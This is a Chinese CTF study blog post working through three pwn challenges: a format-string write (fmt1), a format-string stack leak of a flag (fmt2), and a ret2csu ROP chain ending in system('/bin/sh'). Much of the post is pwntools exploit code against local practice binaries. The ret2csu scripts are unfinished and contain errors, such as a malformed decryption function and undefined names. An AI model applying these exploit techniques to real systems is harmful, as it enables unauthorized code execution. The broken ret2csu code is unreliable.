---
title: "格式化字符串与 ret2csu"
date: 2025-05-25
categories:
  - 二进制安全
  - 格式化字符串
tags:
  - pwn
  - fmt
  - ret2csu
---

## fmt1
首先来看一下这道fmt1

先来分析一下main函数。里面这个ctfshow可能存在漏洞点


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572509-c5da82e5-e24d-42f4-b3a5-8bb418f3ce24.png)

再看底下如果daniu等于6，就会触发shell。把这个daniu写成6就行了。用栈溢出或者格式化字符串。这个既然都写fmt了。应该是要格式化字符串的。

先假装不知道看一下这个ctfshow函数。拿ai计算了一下为啥不能栈溢出


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572665-69d84379-4566-40f2-84b0-b3a0c7edcdb2.png)

算出来这个v2的地址离s还有1个字节。也就是没法栈溢出的

```plain
s的结束地址 = ebp-0x5C + 79 = ebp-0x5C + 0x4F = ebp-0xD
v2的地址   = ebp-0xC
间隔       = ebp-0xC - (ebp-0xD) = 1字节
```

格式化字符串怎么写一下这个payload

用readlef找一下这个daniu的地址

```plain
readelf -s ./fmt1 | grep daniu
```

然后确定偏移量

构造一个包含 **唯一标记**（如 `AAAA`）和多个 `%p` 的字符串，发送到程序：

寻找 `AAAA` 的十六进制形式 `0x41414141` 在输出中的位置。 上例中 `0x41414141` 出现在第 **3** 个 `%p` 的位置，因此偏移量 **k = 3**。

这是在网上找的方法，还不知道具体原理


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572693-b9b4eb01-0b5b-4ac8-853f-7a014329757c.png)

在第七个，然后用自动生成的工具生成

```plain
payload = fmtstr_payload(7, {daniu: 6})
```

exp

```python
from pwn import*
context(arch='i386', os='linux', log_level='debug')
p=process('./fmt1')
gdb.attach(p,'b main')

daniu = 0x804b038
payload = fmtstr_payload(7, {daniu: 6})
p.sendline(payload)

p.interactive()
```

（第一次没弄好。忘把context里的arch改成i386了🙂）

## fmt2
这道题先分析反汇编

我们可以看到它定义了好多变量还是地址的东西（v6~v12）


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572802-46b6019b-0f34-41a8-b4da-b5fcd4f6dc01.png)

然后它和上一道题一样它有一个 v12 = __readfsqword(0x28u);栈保护。

这道题应该是可以栈溢出的。应该也是算一下v12到s的距离。

## 思路是要格式化字符串泄露flag
这道题就是要读取栈上某一个特定空间的的内容。flag规定在那个地方里。它到那个地方会自动读取系统里叫flag.txt的文件。做到payload可以读取

第一次在网上找了一种思路。这道题flag在栈上，那就要想办法通过格式化字符串泄露栈上的数据。就是要泄露s的里面的东西

自动生成的fmtstr_payload是用来覆盖的。要读取flag就需要手写一个。但是这手写就比较难

思路是这样的，要先通过格式化字符串泄露一次栈上的数据。然后再泄露flag

先要写泄露栈地址的（第一次是照着网上模仿的写的）.要发送一个payload,再接收

这个%n$p 就是说以指针形式读取栈上第n个参数的值。

然后接下来处理数据，遇到#就不接收。新学了一个这个

```plain
drop=True
```

丢弃结束符用的。然后空指针（nil）替换成0.（这个是问ai哪有问题的时候它加的）

最后将接收到的data1按16进制0x分割。

```sql
p.sendlineafter(b'Echo as a service\n', b'%12$p%13$p%14$p%15$p#')
data1 = p.recvuntil(b'#', drop=True).decode().replace('(nil)', '0')
parts1 = data1.split('0x')[1:]  # 提取有效地址部分
```

我第一次写的时候是没有这个for循环来处理16进制字符串长度的（后续再说这个）

字节的小端序转换

```plain
bytes.fromhex('67616c66') → b'galf'  
[::-1] → b'flag'  # 反转后得到正确顺序
```

这样多次拼接就可以拼出flag

第一次直接照着网上的这样写，直接用了一下

```plain
b.pop(0) #它说这个是移除第一个元素
c = [bytes.fromhex(i)[::-1] for i in b]
d = b''.join(c)
```

最后打印出来泄露的东西

第二次泄露跟第一次差不多，要注意的就是泄露的第几个参数的值改一下

第一次的exp：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
p = process("./fmt2")
gdb.attach(p, 'b main')

p.sendlineafter(b'Echo as a service\n', b'%12$p%13$p%14$p%15$p#')
data1 = p.recvuntil(b'#', drop=True).decode().replace('(nil)', '0')
parts1 = data1.split('0x')[1:] 
b.pop(0)
c = [bytes.fromhex(i)[::-1] for i in b]  
d = b''.join(c)

p.sendlineafter(b'Echo as a service\n', b'%16$p%17$p%18$p%19$p#')
data2 = p.recvuntil(b'#', drop=True).decode().replace('(nil)', '0')
parts2 = data1.split('0x')[1:] 
b.pop(0)
c = [bytes.fromhex(i)[::-1] for i in b]  
d = b''.join(c)
print(d)

p.interactive()
```

然后它报这个错


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530572681-a301c06b-5475-45ff-acd4-921e1e418f6b.png)

查了以后这个报错说是16进制字符串转化成字节的时候遇到了非法字符

我以为是我写的不规范，把这个网上找的转换的这段重新写一下。

```python
raw_bytes = b''
byte_data = bytes.fromhex(addr)
reversed_bytes = byte_data[::-1]
raw_bytes += reversed_bytes
```

发现还是和原来一样的报错

然后这中间还有一个问题。我没写这个.txt文件😐。补充.txt文件


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573531-b35b908e-9ddb-4ed9-8c15-465cb31bf7ba.png)

然后我问ai,它回答这个


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573587-dd9df222-75b7-432b-a0d6-2d8f7b1c6587.png)

可能这个flag转换的时候出现了奇数长度。总之要想办法转换

这ai底下直接给了一个for循环，把原来泄露的都能成功接收了。（这也太好了吧）


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573686-fe5b2474-cc45-4af3-83f3-cba809fa5d7e.png)

然后还扩展了一下混合的


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573479-2771243b-4cb4-4053-9ccb-ceed6dbc86ea.png)

把这段for循环的放到接收处理数据那一块。最后再改一下转换，打印。

（这个试的时候到12个printf后面就是flag。其实第10个就有flag了）

## 从第几个开始写
64位，它前六个在寄存器里。从第7个之后开始写都行。

先算偏移量


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530573810-7deb0323-5186-4b17-b3b7-3a9041a19964.png)

是8

再算s到格式化字符串.rbp-40可以算一下s

这个我不太会算。看了答案以后知道是从12个。就开始试。它这fgets有个限制最多只能写50个字节覆盖s。这个发payload的时候不要超过50个。一个%12$是8个，先发4个试一下

```plain
fgets(s, 50, stream);
```

这是9的时候：


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574298-7a082a40-4648-45ea-a487-6d7cbb0c1e12.png)

10：


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574249-a7b12da0-8bdf-4b89-b38c-19fe07741058.png)

最终exp（终于对了一次）

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
p = process("./fmt2")
gdb.attach(p, 'b main') 

p.sendlineafter(b'Echo as a service\n', b'%12$p%13$p%14$p%15$p#')
data1 = p.recvuntil(b'#', drop=True).decode().replace('(nil)', '0')
parts1 = data1.split('0x')[1:] 
raw_bytes = b''
for addr_part in parts1:
    if len(addr_part) % 2 != 0:
        addr_part = '0' + addr_part
    padded = addr_part.ljust(16, '0')  
    raw_bytes += bytes.fromhex(padded)[::-1]

p.sendlineafter(b'Echo as a service\n', b'%16$p%17$p%18$p%19$p#')
data2 = p.recvuntil(b'#', drop=True).decode().replace('(nil)', '0')
parts2 = data2.split('0x')[1:]
for addr_part in parts2:
    if len(addr_part) % 2 != 0:
        addr_part = '0' + addr_part
    padded = addr_part.ljust(16, '0') 
    raw_bytes += bytes.fromhex(padded)[::-1]

print("flag is in the behide :", raw_bytes)
p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530574296-5a7cd76f-6757-453a-ac3a-ddb647061c64.png)

这个最后如果要提交的话要记得去掉 \x00 把用零补齐的去掉

## orw
## retcsu
retcsu跟libc有点像

这是第一次它说接收有点问题。

```python
from pwn import *

# 设置调试环境
p = process('./ret2csu')
context(os='linux', arch='amd64', log_level='info')

# 加载文件
elf = ELF('./ret2csu')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def dec(data):
    # 解密过程：先异或还原，再逆向位移操作
    result = []
    for byte in data:
        xor_byte = byte ^ 0x5A
        # 2. 逆向位移操作（加密是右移3位+左移5位）
        # 解密需要左移3位 + 右移5位（合并后等价循环左移3位）
        original = ((xor_byte > 5)) & 0xFF
        result.append(original)
    return bytes(result)

# 第一阶段：泄露write地址

# 准备溢出数据
padding = b'a' * 24  # 覆盖缓冲区

# 使用csu_init中的gadgets
csu_pop = 0x4013AA    # 弹出寄存器的地址
csu_call = 0x401390   # 调用函数的地址

# 构造ROP链
payload = padding
payload += p64(csu_pop)
payload += p64(0)      # rbx
payload += p64(1)      # rbp
payload += p64(elf.got['write'])  # r12 -> 要调用的函数地址
payload += p64(8)      # r13 -> rdx (长度)
payload += p64(elf.got['write']) # r14 -> rsi (buffer地址)
payload += p64(1)      # r15 -> rdi (文件描述符)
payload += p64(csu_call)  # 调用write(1, write@got, 8)
payload += b'B'*56     # 填充剩余空间
payload += p64(elf.symbols['main']) # 返回main重新执行

# 发送加密后的payload
p.sendline(enc(payload))

# 接收泄露的地址
real_address = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = write_addr - libc.symbols['write']
log.success(f"libc base: {hex(libc_base)}")

# 第二阶段：执行system("/bin/sh")
system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 构造新payload
payload2 = padding
payload2 += p64(0x40101a)    # 栈对齐用的ret指令
payload2 += p64(0x4013b3)    # pop rdi; ret
payload2 += p64(bin_sh)      # 参数：/bin/sh地址
payload2 += p64(system_addr) # 调用system

# 发送并获取shell
p.sendline(enc(payload2))
p.interactive()
```

先要找到rdi，rsi的地址。不找write的plt和got表也行。直接elf打开

再找一个ret的地址。用来栈对齐。（这段没写完，解密有点问题。导致接收不到）

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process('./ret2csu')
elf=ELF('./ret2csu')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#jiemi
def dec(data):
    # 解密过程：先异或还原，再逆向位移操作
    result = []
    for byte in data:
        xor_byte = byte ^ 0x5A
        # 2. 逆向位移操作（加密是右移3位+左移5位）
        # 解密需要左移3位 + 右移5位（合并后等价循环左移3位）
        original = ((xor_byte > 5)) & 0xFF
        result.append(original)
    return bytes(result)
#address
gadget2=0x401390
gadget1=0x4013AA
write_got=elf.got['write']
write_plt=elf.plt['write']
main_addr=elf.symbols['main']
pop_rdi_ret=0x4013b3
pop_rsi_ret=0x4013b1
ret=0x40101a

#first payload
payload=b'a'*0x18
payload+=p64(gadget1)
payload+=p64(0)
payload+=p64(1)
payload+=p64(1)
payload+=p64(write_got)
payload+=p64(8)
payload+=p64(write_got)
payload+=p64(gadget2)
payload+=b'a'*0x38
payload+=p64(main_addr)

p.sendline(dec(payload))
p.sendline(payload)
p.recvuntil(b'Encrypted: ')
p.recvuntil(b'\n')

real_address = u64(p.recv(6).ljust(8,b'\x00'))
print("real_address: ",hex(real_address))
#count libc,system,bin/sh
libc_base = real_address -libc.sym['write']
system_address = libc_base + libc.sym['system']
binsh_address = libc_base + next(libc.search(b"/bin/sh"))

#second payload
payload=b'a'*0x18
payload+=p64(ret)
payload+=p64(pop_rdi_ret)
payload+=p64(binsh_address)
payload+=p64(system_address)

p.sendline(dec(payload))
p.sendline(payload)
p.interactive()
```